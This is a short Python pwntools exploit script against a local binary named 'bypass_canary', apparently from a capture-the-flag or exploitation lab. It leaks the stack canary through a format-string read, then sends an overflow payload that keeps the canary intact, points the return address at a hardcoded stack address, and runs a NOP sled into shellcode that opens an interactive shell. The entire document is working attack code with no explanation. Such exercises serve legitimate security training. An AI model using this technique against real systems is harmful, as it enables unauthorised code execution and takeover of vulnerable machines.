import pwn

elf = pwn.context.binary = pwn.ELF("./bypass_canary")
libc = elf.libc

if pwn.args.GDB:
    io = pwn.gdb.debug(elf.path)
else:
    io = pwn.process(elf.path)

io.sendline(b"%11$lx")
stack_canary = int(io.recvline(), 16)
print(f"stack_canary: {hex(stack_canary)}")

return_address_ofs = 56
shellcode = pwn.asm(pwn.shellcraft.sh())
stack_address = 0x7FFFFFFFE400

payload = b"A" * (return_address_ofs - 16)
payload += pwn.p64(stack_canary)
payload += pwn.p64(0xDEADBEEF)
payload += pwn.p64(stack_address)
payload += b"\x90" * 256  # nop sled
payload += shellcode

io.sendline(payload)

io.interactive()
